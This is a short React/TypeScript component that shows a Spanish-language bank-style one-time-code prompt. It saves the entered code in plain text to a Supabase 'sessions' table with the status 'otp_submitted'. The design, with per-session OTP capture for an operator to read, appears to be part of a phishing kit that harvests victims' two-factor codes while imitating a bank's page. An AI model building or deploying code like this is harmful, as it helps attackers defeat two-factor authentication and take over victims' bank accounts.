import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";

const UniOtpInput = ({ sessionId }: { sessionId: string }) => {
  const [code, setCode] = useState("");
  const [sending, setSending] = useState(false);

  const handleSubmit = async () => {
    if (!code || code.length < 4) return;
    setSending(true);
    await supabase.from("sessions").update({ otp_code: code, status: "otp_submitted" }).eq("id", sessionId);
    setSending(false);
  };

  return (
    <div>
      <input
        type="text"
        value={code}
        onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
        maxLength={8}
        placeholder="Código"
        className="w-full h-[48px] px-3 rounded-[4px] text-[18px] text-center tracking-[0.3em] focus:outline-none mb-4"
        style={{ border: "2px solid #004b6e", color: "#333333", backgroundColor: "#ffffff" }}
        autoFocus
      />
      <button
        onClick={handleSubmit}
        disabled={sending || code.length < 4}
        className="w-full h-[48px] text-[15px] font-medium rounded-[4px] transition-colors disabled:opacity-60"
        style={{ backgroundColor: "#004b6e", color: "#ffffff" }}
      >
        {sending ? "Enviando..." : "Confirmar"}
      </button>
    </div>
  );
};

export default UniOtpInput;
